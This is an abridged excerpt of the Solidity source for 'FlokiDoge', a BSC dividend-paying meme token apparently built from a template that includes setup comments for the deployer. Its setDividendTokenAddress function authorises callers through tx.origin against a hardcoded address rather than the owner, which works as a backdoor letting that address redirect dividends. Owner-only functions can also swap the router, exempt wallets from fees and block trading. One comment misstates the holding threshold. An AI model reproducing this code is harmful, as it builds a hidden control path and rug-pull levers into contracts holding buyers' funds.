...
/*Div token set to cake , can be changed to anything on BSC but will have to update the name of the "cakeDividendToken" and "cakeDividendTracker"
Change marketingWallet and teamWallet , two wallets for "marketing", they have to be different and con not be the wallet that will launch
Change address in the "setDividendTokenAddress" to the wallet that will launch the coin
DELETE THIS AFTER MAKING CHANGES*/



// https://t.me/FlokiDoge
...
contract DividendPayingToken is ERC20, Ownable, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0x5e6ab50D01523179Bf2Ba18726725F9C7E154f87, "Only owner can change dividend contract address");
...
contract FlokiDoge is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("FlokiDoge", "$FlokiDoge") {
    	cakeDividendTracker = new CakeDividendTracker();
    	

    	marketingWallet = 0x047A25f1d21786DE1B56E5FB2211244C1E314B63;
    	teamWallet = 0x8F39Aa02053Af1A66D01898C1bcA6832f6974141;
    ...
    receive() external payable {
  	...
  	function updateTeamWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != teamWallet, "FlokiDoge: The team wallet is already this address");
  	...
  	function updateMarketingWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != marketingWallet, "FlokiDoge: The marketing wallet is already this address");
        excludeFromFees(_newWallet, true);
    ...
    function updateCakeDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(cakeDividendTracker), "FlokiDoge: The dividend tracker already has that address");

        CakeDividendTracker newCakeDividendTracker = CakeDividendTracker(payable(newAddress));

        require(newCakeDividendTracker.owner() == address(this), "FlokiDoge: The new dividend tracker must be owned by the FlokiDoge token contract");
    ...
    function updateCakeDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "FlokiDoge: Fee must be less than 6%");
    ...
    function updateUniswapV2Router(address newAddress) external onlyOwner {
        require(newAddress != address(uniswapV2Router), "FlokiDoge: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(isExcludedFromFees[account] != excluded, "FlokiDoge: Account is already exluded from fees");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "FlokiDoge: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        require(automatedMarketMakerPairs[pair] != value, "FlokiDoge: Automated market maker pair is already set to that value");
    ...
    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue != gasForProcessing, "FlokiDoge: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
        ...
        require(tradingIsEnabled || (isExcludedFromFees[from] || isExcludedFromFees[to]), "FlokiDoge: Trading has not started yet");
...
contract CakeDividendTracker is DividendPayingToken {
    ...
    constructor() DividendPayingToken("FlokiDoge_Ethereum_Dividend_Tracker", "FlokiDoge_Ethereum_Dividend_Tracker", 0x2B3F34e9D4b127797CE6244Ea341a83733ddd6E4) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "FlokiDoge_Ethereum_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "FlokiDoge_Ethereum_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main FlokiDoge contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "FlokiDoge_Ethereum_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "FlokiDoge_Ethereum_Dividend_Tracker: Cannot update claimWait to same value");
